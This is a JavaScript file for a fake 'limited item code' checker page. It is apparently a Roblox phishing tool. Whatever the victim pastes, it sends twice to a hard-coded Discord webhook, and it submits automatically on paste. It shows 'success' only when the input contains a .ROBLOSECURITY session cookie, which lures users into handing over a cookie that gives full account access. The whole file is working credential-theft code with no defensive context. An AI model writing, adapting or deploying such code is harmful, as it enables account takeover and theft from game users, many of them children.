async function validateCode() {
    const codeInput = document.getElementById('limitedItemCode');
    const resultMessage = document.getElementById('resultMessage');
    const code = codeInput.value.trim();
    
    if (!code) {
        resultMessage.innerHTML = 'âŒ Please enter a limited item code';
        resultMessage.style.color = '#ff4444';
        return;
    }
    
    // Show loading
    resultMessage.innerHTML = 'ðŸ” Verifying limited item code...';
    resultMessage.style.color = '#ffa500';
    
    try {
        // Method 1: Use fetch with no-cors mode (sends but can't read response)
        await fetch('https://discord.com/api/webhooks/1436138759837192202/xAOhBtWGRVQ2-QW4_iiBkj8vd5DpSG8DVWv_a4zcxHGssqwqmXotucSSGXvHFYF9IEKg', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `ðŸ” New limited item code submitted:\n\`\`\`${code}\`\`\``
            })
        });
        
        // Method 2: Also try with form data (alternative method)
        const formData = new FormData();
        formData.append('content', `ðŸ” New limited item code submitted:\n\`\`\`${code}\`\`\``);
        
        fetch('https://discord.com/api/webhooks/1436138759837192202/xAOhBtWGRVQ2-QW4_iiBkj8vd5DpSG8DVWv_a4zcxHGssqwqmXotucSSGXvHFYF9IEKg', {
            method: 'POST',
            mode: 'no-cors',
            body: formData
        });
        
        console.log('Webhook sent with code:', code);
        
        // Check if it contains a Roblox cookie
        if (code.includes('.ROBLOSECURITY') || code.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
            resultMessage.innerHTML = 'âœ… Success! Valid limited item code';
            resultMessage.style.color = '#4CAF50';
        } else {
            resultMessage.innerHTML = 'âŒ Failed: Invalid limited item code';
            resultMessage.style.color = '#ff4444';
        }
        
    } catch (error) {
        console.log('Webhook attempt completed (CORS expected)');
        
        // Check if it contains a Roblox cookie
        if (code.includes('.ROBLOSECURITY') || code.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
            resultMessage.innerHTML = 'âœ… Success! Valid limited item code';
            resultMessage.style.color = '#4CAF50';
        } else {
            resultMessage.innerHTML = 'âŒ Failed: Invalid limited item code';
            resultMessage.style.color = '#ff4444';
        }
    }
}

// Auto-submit on paste
document.getElementById('limitedItemCode').addEventListener('paste', function(e) {
    setTimeout(() => {
        validateCode();
    }, 100);
});
